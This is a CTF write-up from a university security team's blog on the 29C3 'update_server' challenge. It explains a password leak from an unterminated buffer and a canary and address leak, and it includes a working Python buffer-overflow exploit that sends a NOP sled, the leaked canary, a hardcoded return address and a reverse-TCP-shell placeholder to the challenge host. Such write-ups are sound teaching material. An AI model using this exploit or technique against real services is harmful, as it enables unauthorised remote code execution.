
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>29C3 CTF Exploitation 300 update_server - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="It&#8217;s a version update service. If the input version number is smaller than current version, remote server will send you back the current &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net/www/29c3-ctf-exploitation-300-update_server">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blue-lotus</a></h1>
  
    <h2>Security Research Team @ Tsinghua University</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">29C3 CTF Exploitation 300 Update_server</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>It&#8217;s a version update service. If the input version number is smaller than current version, remote server will send you back the current version. If the input version number is bigger, remote server will save the input version number and ask for some &#8220;link&#8221; information which will lead to buffer overflow. However, the update of version numver is authenticated by a password given by remote runtime parameter. We should bypass the authentcation before we exploit the buufer overflow. I noticed some code as below:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_equal_version.jpg" alt="update_server_equal_version" /></p>

<p>If the input version number equals current version number, the server will send back the input version string without adding null-byte at the end of the intput buffer. After checking the stack layout, we will surprisedly find that the password is right after the buffer.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_stack.jpg" alt="update_server_stack" /></p>

<p>So we can construnt a long enough string to get the password exposed. It is &#8220;1n53cUr3-pppAssW0rD&#8221;. We are not finished here, we&#8217;ve just started.</p>

<p>Notice that the program is using gcc stack protection mechanism. Stack is protected against bufferoverflow with the 4-byte canary. What&#8217;s more, the servie is running with ASLR.</p>

<p>Carefully check the vulnerable code again:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/update_server_exploit.jpg" alt="update_server_exploit" /></p>

<p>Before reveiving the second long input buffer, the program will show all the versions to us. Versions are stored in an array. The length is parsed from the first byte. So we can construct a large array length to get more strings exposed on the stack! Using such trick, we can get 4 byte canary and even address in the stack to bypass ASLR!</p>

<p>What&#8217;s left is quite easy, just run your code and enjoy your flag:)</p>

<pre><code>import sys
import time
import socket
shellcode = WE_USE_REVERSE_TCP_SHELL

import string
def chr2hex(s):
  ss = ""
  for c in s:
    if c in string.printable:
      ss += c
      continue
    h = hex(ord(c))[2:]
    if len(h) == 1: h = "0"+h
    ss += "\\x" + h
  return ss


password = "1n53cUr3-pppAssW0rD"

s = socket.socket()
s.connect(("94.45.252.235", 1024))
#s.connect(("166.111.132.184", 1024))

#print s.recv(10000)
#s.send("\x013.0"+"A"*124)
#print s.recv(10000)
#print s.recv(10000)

print s.recv(10000)
n = 90
canary = "\x00\x4e\xae\x8a"

#s.send("\x013.0"+"A"*124)
s.send(chr(n)+"4"*127)
print s.recv(10000)
print s.recv(10000)
s.send(password)

print s.recv(10000)
ret = s.recv(10000)
print ret

print "*********"
print chr2hex(ret)
i = ret.rfind(password)
print "*********"
print chr2hex(ret[i+128:i+128+4]) # print canary

# hardcoded address is acquired from above output
buf = "\x90"*256+canary+"\x90"*(288-256-4)+"\x9c\xf7\xba\xbf"+"\x90"*600+shellcode+\
    "A"*(1024-288-4-600-len(shellcode))

s.send(buf)

print s.recv(10000)
print s.recv(10000)
print s.recv(10000)
</code></pre>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>

      








  


<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/29c3-ctf-exploitation-300-update_server/" data-via="" data-counturl="http://www.blue-lotus.net/www/29c3-ctf-exploitation-300-update_server/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/29c3-ctf-minesweeper/" title="Previous Post: 29C3 CTF Exploitation 100 minesweeper">&laquo; 29C3 CTF Exploitation 100 minesweeper</a>
      
      
        <a class="basic-alignment right" href="/29c3-ctf-exploitation-400-proxy/" title="Next Post: 29C3 CTF Exploitation 400 proxy">29C3 CTF Exploitation 400 proxy &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
